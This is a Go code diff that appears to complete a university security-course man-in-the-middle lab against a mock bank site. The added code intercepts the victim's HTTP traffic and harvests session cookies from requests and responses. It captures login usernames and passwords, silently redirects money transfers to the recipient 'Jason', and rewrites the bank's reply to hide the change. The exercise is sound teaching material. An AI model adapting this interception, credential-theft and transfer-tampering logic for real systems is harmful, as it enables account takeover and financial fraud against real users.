@@ -32,6 +32,7 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"strings"
 
 	cs155 "fakebank.com/mitm/network" // For `cs155.*` methods
 	"github.com/google/gopacket"
@@ -450,6 +451,30 @@ func handleHTTP(rw http.ResponseWriter, r *http.Request) {
 		os.Exit(1)
 	}
 
+	// eat request cookies
+	reqCookies := r.Cookies()
+	if len(reqCookies) > 0 {
+		for _, cookie := range reqCookies {
+			cs155.StealServerCookie(cookie.Name, cookie.Value)
+		}
+	}
+
+	evilClient := http.Client{}
+	request := spoofBankRequest(r)
+	response, _ := evilClient.Do(request)
+
+	// eat response cookies
+	cookiesSet := response.Cookies()
+	if len(cookiesSet) > 0 {
+		for _, cookie := range cookiesSet {
+			cs155.StealServerCookie(cookie.Name, cookie.Value)
+		}
+	}
+
+	// send response to client
+	writeClientResponse(response, request, &rw)
+
+	// spoofBankRequest(r)
 	// TODO #8: Handle HTTP requests. Roughly speaking, you should delegate most of the work to
 	//          SpoofBankRequest and WriteClientResponse, which handle endpoint-specific tasks,
 	//          and use this function for the more general tasks that remain, like stealing cookies
@@ -475,6 +500,17 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
 
 	if origRequest.URL.Path == "/login" {
 
+		err := origRequest.ParseForm()
+		if err != nil {
+			log.Panic(err)
+		}
+		// send stolen creds
+		cs155.StealCredentials(origRequest.FormValue("username"), origRequest.FormValue("password"))
+
+		// send new request
+		strForm := origRequest.Form.Encode()
+		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, strings.NewReader(strForm))
+
 		// TODO #9: Since the client is logging in,
 		//          - parse the request's form data,
 		//          - steal the credentials,
@@ -496,6 +532,20 @@ func spoofBankRequest(origRequest *http.Request) *http.Request {
 		bankRequest, _ = http.NewRequest("POST", bankURL, nil)
 
 	} else if origRequest.URL.Path == "/transfer" {
+
+		err := origRequest.ParseForm()
+		if err != nil {
+			log.Panic(err)
+		}
+		// toK := origRequest.FormValue("to")
+
+		if origRequest.FormValue("to") != "" {
+			// toK = "Jason"
+			origRequest.Form.Set("to", "Jason")
+		}
+
+		strForm := origRequest.Form.Encode()
+		bankRequest, _ = http.NewRequest(origRequest.Method, bankURL, strings.NewReader(strForm))
 
 		// TODO #10: Since the client is transferring money,
 		//			- parse the request's form data
@@ -546,7 +596,12 @@ func writeClientResponse(bankResponse *http.Response, origRequest *http.Request,
 		//
 		// Hint:    bytes.NewReader() is analogous to strings.NewReader() in the
 		//          /login endpoint, where you could wrap a string in an io.Reader.
-
+		bdy, err := io.ReadAll(bankResponse.Body)
+		if err != nil {
+			log.Panic(err)
+		}
+		new_bdy := strings.ReplaceAll(string(bdy), "Jason", origRequest.Form.Get("to"))
+		bankResponse.Body = io.NopCloser(strings.NewReader(new_bdy))
 	}
 
 	// Now that all changes are complete, write the body
